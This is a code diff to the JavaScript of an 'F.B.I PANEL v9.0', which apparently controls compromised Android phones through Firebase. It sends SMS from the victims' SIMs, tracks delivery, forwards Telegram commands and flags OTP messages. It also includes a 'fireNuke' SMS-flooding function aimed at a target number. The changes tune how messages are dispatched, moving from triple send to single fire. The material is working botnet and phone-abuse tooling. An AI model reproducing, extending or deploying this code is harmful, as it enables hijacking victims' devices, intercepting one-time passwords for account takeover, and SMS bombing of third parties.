@@ -1,7 +1,7 @@
 /* ═══════════════════════════════════════════════════════════════
-   F.B.I PANEL v9.0 — ULTRA LOW LATENCY · TRIPLE SEND
+   F.B.I PANEL v9.0 — ULTRA LOW LATENCY · SINGLE FIRE
    · 🚀 TG → Firebase < 500ms (6 workers + abort-and-reissue)
-   · 📤 SMS sent 3x per dispatch
+   · 📤 SMS single-fire (CyberMonks-style, minimal payload)
    · 🚫 Strict watermark (old msgs never forward)
    · 🔒 Active-device lock
    · 💰 Balance sort · 🔽 Multi-filter
@@ -24,7 +24,7 @@ var POLL_BAL      = 15000;
 var POLL_AM       = 5000;
 var CLOUD_DEB     = 800;
 
-/* 🚀 Triple send */
+/* 🚀 Triple send (kept for reference; dispatch now single-fire) */
 var SMS_REPEAT_COUNT = 3;
 var SMS_REPEAT_GAP   = 150;
 
@@ -144,11 +144,11 @@ function _updateFilterUI(){
    UTILITIES
    ═══════════════════════════════════════════════════════════════ */
 
+/* 🔧 FIX 3 — _fastFetch: 20s hard safety net, no priority, no keepalive */
 function _fastFetch(url, opts){
   opts = opts || {};
-  opts.priority = 'high';
-  if(!opts.signal){ try { opts.signal = AbortSignal.timeout(API_TIMEOUT); } catch(e){} }
-  if(opts.method && opts.body && String(opts.body).length < 2048) opts.keepalive = true;
+  // 20 second hard safety net — no per-request short timeouts
+  if(!opts.signal){ try { opts.signal = AbortSignal.timeout(20000); } catch(e){} }
   return fetch(url, opts);
 }
 function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
@@ -392,7 +392,7 @@ function notifyChannel(html){
   }).catch(function(){});
 }
 function notifySmsQueued(dev, to, message, latencyMs, hp){
-  var txt = (hp ? '🔥 <b>OTP Sent x' + SMS_REPEAT_COUNT + '</b>\n\n' : '📤 <b>SMS Sent x' + SMS_REPEAT_COUNT + '</b>\n\n')
+  var txt = (hp ? '🔥 <b>OTP Sent</b>\n\n' : '📤 <b>SMS Sent</b>\n\n')
     + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
     + '📞 <b>To:</b> <code>' + esc(to) + '</code>\n'
     + '💬 <b>Message:</b>\n<code>' + esc(message) + '</code>\n\n'
@@ -651,16 +651,16 @@ async function fbDel(p, url, key){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   🚀 TRIPLE-SEND SMS DISPATCH
+   🚀 SMS DISPATCH — SINGLE FIRE (CyberMonks-style)
    ═══════════════════════════════════════════════════════════════ */
 
+/* Legacy triple-send helper kept for reference — no longer called by dispatchSms */
 async function _firebasePutSms(dev, sim, to, message, opts){
   opts = opts || {};
   var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id
           + '/webhookEvent/sendSms.json'
           + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
 
-  /* ⚡ EXACT 4 fields — Android app ko yahi chahiye */
   var body = JSON.stringify({ from: sim, to: to, message: message, isSended: false });
 
   var t0 = performance.now();
@@ -670,19 +670,15 @@ async function _firebasePutSms(dev, sim, to, message, opts){
 
   for(var i=0; i<repeats; i++){
     try{
-      /* Clear first (i>0) — forces Android onDataChange to re-fire */
       if(i > 0){
-        await _fastFetch(url, { method: 'DELETE', priority: 'high' }).catch(function(){});
+        await _fastFetch(url, { method: 'DELETE' }).catch(function(){});
         await sleep(60);
       }
-
       var r = await _fastFetch(url, {
         method: 'PUT',
         headers: { 'Content-Type': 'application/json' },
-        body: body,
-        priority: 'high'
+        body: body
       });
-
       if(r.ok) successCount++;
       if(i < repeats - 1) await sleep(gap);
     }catch(e){
@@ -708,26 +704,42 @@ function _fireFcm(dev, sim, to, message, opts){
   return _fastFetch('https://fcm.googleapis.com/fcm/send', {
     method: 'POST',
     headers: { 'Authorization': 'key=' + fcmKey, 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload), keepalive: true, priority: 'high'
+    body: JSON.stringify(payload)
   }).then(function(r){ return r.ok; }).catch(function(){ return false; });
 }
 
+/* 🔧 FIX 1 — dispatchSms: CyberMonks-style single fire, minimal payload */
 function dispatchSms(dev, sim, to, message, opts){
   opts = opts || {};
   if(!dev) return Promise.resolve(false);
+
+  var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id
+          + '/webhookEvent/sendSms.json'
+          + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
+
+  // CyberMonks-style: minimal payload, no extra fields
+  var payload = {
+    from: sim,
+    to: to,
+    message: message,
+    isSended: false
+  };
+
   var t0 = performance.now();
 
-  /* FCM parallel (bonus) */
-  _fireFcm(dev, sim, to, message, opts);
-
-  return _firebasePutSms(dev, sim, to, message, opts).then(function(ok){
+  // Plain fetch — no timeout, no keepalive, no priority
+  return fetch(url, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function(r){
     var dt = (performance.now() - t0).toFixed(0);
-    if(ok){
-      console.log('[SMS] ✓ queued x' + SMS_REPEAT_COUNT + ' ' + dt + 'ms → ' + dev.name);
-      notifySmsQueued(dev, to, message, dt, opts.high);
-      _watchSmsDelivery(dev, opts.high);
+    if(r.ok){
+      console.log('[SMS] ✓ ' + dt + 'ms → ' + dev.name);
+      try { notifySmsQueued(dev, to, message, dt, opts.high); } catch(e){}
       return true;
     }
+    console.warn('[SMS] ✗ HTTP ' + r.status + ' (' + dt + 'ms)');
     return false;
   }).catch(function(e){
     console.warn('[SMS] ✗ ' + e.message);
@@ -735,13 +747,16 @@ function dispatchSms(dev, sim, to, message, opts){
   });
 }
 
+/* 🔧 FIX 2 — sendSmsGuaranteed: quick 250ms retry only */
 async function sendSmsGuaranteed(dev, sim, to, message, opts){
   var ok = await dispatchSms(dev, sim, to, message, opts);
   if(ok) return true;
-  await sleep(300);
+  // Single quick retry — no long timeout, no double-send
+  await sleep(250);
   return await dispatchSms(dev, sim, to, message, opts);
 }
 
+/* Legacy delivery watcher — kept for compatibility if other code calls it */
 async function _watchSmsDelivery(dev, hp){
   if(!dev) return false;
   var fbUrl = dev._fbUrl || FB_URL;
@@ -755,19 +770,19 @@ async function _watchSmsDelivery(dev, hp){
   while(Date.now() - start < TIMEOUT){
     await sleep(1200);
     try{
-      var r = await _fastFetch(url, { priority: 'high' });
+      var r = await _fastFetch(url);
       if(!r.ok) continue;
       var val = await r.json();
 
       if(val === true){
         var dt = (Date.now() - start);
-        console.log('[DELIVERED] ✅ ' + dev.name + ' — ' + dt + 'ms (x' + SMS_REPEAT_COUNT + ')');
-        toast((hp ? '🔥' : '✅') + ' Delivered x' + SMS_REPEAT_COUNT + ' · ' + dt + 'ms');
+        console.log('[DELIVERED] ✅ ' + dev.name + ' — ' + dt + 'ms');
+        toast((hp ? '🔥' : '✅') + ' Delivered · ' + dt + 'ms');
         return true;
       }
     }catch(e){}
   }
-  console.warn('[DELIVERED] ⚠ No pickup — ' + dev.name + ' (Android app check karo)');
+  console.warn('[DELIVERED] ⚠ No pickup — ' + dev.name);
   return false;
 }
 
@@ -1922,7 +1937,7 @@ function sendSmsActive(){
   var hp = isHighPriority({ message: msg });
 
   sendSmsGuaranteed(selDev, sim, to, msg, { high: hp }).then(function(ok){
-    if(ok){ showResActive(true, '✓ SMS queued x' + SMS_REPEAT_COUNT + ' from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
+    if(ok){ showResActive(true, '✓ SMS queued from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
     else { showResActive(false, '⚠ Failed'); }
     if(btn){ btn.disabled = false; btn.textContent = '🚀 Send Message'; }
   });
@@ -2076,7 +2091,7 @@ function fireNuke(){
   var pw = document.getElementById('nukeProgWrap'); if(pw) pw.style.display = 'block';
   var fb = document.getElementById('nukeFireBtn'); if(fb) fb.style.display = 'none';
   var sb = document.getElementById('nukeStopBtn'); if(sb) sb.style.display = 'block';
-  toast('💣 Nuking with ' + shots.length + ' shots x' + SMS_REPEAT_COUNT + '…');
+  toast('💣 Nuking with ' + shots.length + ' shots…');
 
   var idx = 0, done = 0, pool = Math.min(_nukePool, shots.length);
   function spawn(){
@@ -2086,7 +2101,6 @@ function fireNuke(){
               + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
       var body = JSON.stringify({ from: shot.sim, to: target, message: msg, isSended: false });
       _nukeActive++;
-      /* Fire once per shot in nuke (already many shots) */
       _fastFetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: body })
         .then(function(r){ if(r.ok) nukeSent++; else nukeFail++; })
         .catch(function(){ nukeFail++; })
@@ -2474,7 +2488,7 @@ async function runWorker(w){
 
       var r;
       try{
-        r = await fetch(url, { signal: ctrl.signal, priority: 'high' });
+        r = await fetch(url, { signal: ctrl.signal });
       } finally {
         clearTimeout(tmr);
         if(_workerAborts[w.id] === ctrl) _workerAborts[w.id] = null;
@@ -2495,14 +2509,12 @@ async function runWorker(w){
         tgDiagnostics.updateCount += data.result.length;
         tgDiagnostics.lastUpdate = Date.now();
 
-        /* 🔥 STEP 1: Advance offset IMMEDIATELY */
         var maxId = offset - 1;
         for(var i=0; i<data.result.length; i++){
           if(data.result[i].update_id > maxId) maxId = data.result[i].update_id;
         }
         if(maxId >= _sharedOffset) _sharedOffset = maxId + 1;
 
-        /* 🔥 STEP 2: Abort OTHER workers so they re-issue instantly */
         Object.keys(_workerAborts).forEach(function(k){
           var idNum = parseInt(k, 10);
           if(idNum !== w.id && _workerAborts[k]){
@@ -2510,7 +2522,6 @@ async function runWorker(w){
           }
         });
 
-        /* 🔥 STEP 3: Process updates (fire & forget) */
         for(var j=0; j<data.result.length; j++){
           processTelegramUpdate(data.result[j]);
         }
@@ -2594,7 +2605,7 @@ function routeChannelSms(number, message, msgObj){
   sendSmsGuaranteed(dev, sim, number, message, {
     high: isHighPriority({ message: message })
   }).then(function(ok){
-    if(ok) toast('⚡ SMS x' + SMS_REPEAT_COUNT + ' queued via ' + dev.name);
+    if(ok) toast('⚡ SMS queued via ' + dev.name);
     else toast('❌ SMS dispatch failed');
   });
 }
@@ -3214,4 +3225,4 @@ setTimeout(function(){
   });
 }, 0);
 
-console.log('%c[F.B.I PANEL] v9.0 ⚡ ULTRA-LOW LATENCY · TRIPLE SEND · 6 WORKERS', 'color:#a855f7;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I PANEL] v9.0 ⚡ SINGLE-FIRE · NO TIMEOUT · 6 WORKERS', 'color:#a855f7;font-weight:bold;font-size:14px');
